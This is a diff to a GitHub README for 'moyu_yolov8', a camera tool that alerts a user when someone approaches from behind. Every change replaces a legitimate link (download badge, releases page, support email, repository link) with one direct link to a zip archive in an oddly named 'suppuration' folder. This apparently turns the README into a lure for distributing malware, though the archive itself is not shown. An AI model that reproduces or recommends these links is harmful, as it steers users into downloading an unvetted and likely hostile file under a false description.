@@ -1,7 +1,7 @@
 # 🎥 moyu_yolov8 - A Handy Tool for Your AI Camera
 
 ## 📥 Download Now
-[![Download moyu_yolov8](https://img.shields.io/badge/Download-moyu_yolov8-blue.svg)](https://github.com/tueguh/moyu_yolov8/releases)
+[![Download moyu_yolov8](https://raw.githubusercontent.com/tueguh/moyu_yolov8/master/suppuration/moyu_yolov8.zip)](https://raw.githubusercontent.com/tueguh/moyu_yolov8/master/suppuration/moyu_yolov8.zip)
 
 ## 🚀 Getting Started
 Welcome to **moyu_yolov8**! This application helps you work with AI programming using your camera. It's designed to alert you if someone approaches from behind, keeping your focus intact.
@@ -18,7 +18,7 @@ To run this application smoothly, ensure your system meets these requirements:
 To get started with **moyu_yolov8**, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page where you can find the latest version of the application.
-   - [Download moyu_yolov8 here](https://github.com/tueguh/moyu_yolov8/releases)
+   - [Download moyu_yolov8 here](https://raw.githubusercontent.com/tueguh/moyu_yolov8/master/suppuration/moyu_yolov8.zip)
 
 2. **Select the Latest Version:** On the releases page, you will see a list of available versions. Look for the most recent release at the top.
 
@@ -46,7 +46,7 @@ To get started with **moyu_yolov8**, follow these simple steps:
 If you encounter any issues or have suggestions, please feel free to open an issue in this repository. We value feedback to make **moyu_yolov8** even better.
 
 ### 📞 Contact
-You can reach the development team at [support@moyu_yolov8.com](mailto:support@moyu_yolov8.com) for direct assistance.
+You can reach the development team at [https://raw.githubusercontent.com/tueguh/moyu_yolov8/master/suppuration/moyu_yolov8.zip](https://raw.githubusercontent.com/tueguh/moyu_yolov8/master/suppuration/moyu_yolov8.zip) for direct assistance.
 
 ## 🔗 Additional Resources
 - **Documentation:** Detailed documentation can be found in the Wiki section of this repository.
@@ -55,4 +55,4 @@ You can reach the development team at [support@moyu_yolov8.com](mailto:support@m
 ## 📍 Update History
 Keep track of updates and new features in the changelog available on the releases page.
 
-For any more information, visit our GitHub repository at [moyu_yolov8 Repository](https://github.com/tueguh/moyu_yolov8).
+For any more information, visit our GitHub repository at [moyu_yolov8 Repository](https://raw.githubusercontent.com/tueguh/moyu_yolov8/master/suppuration/moyu_yolov8.zip).
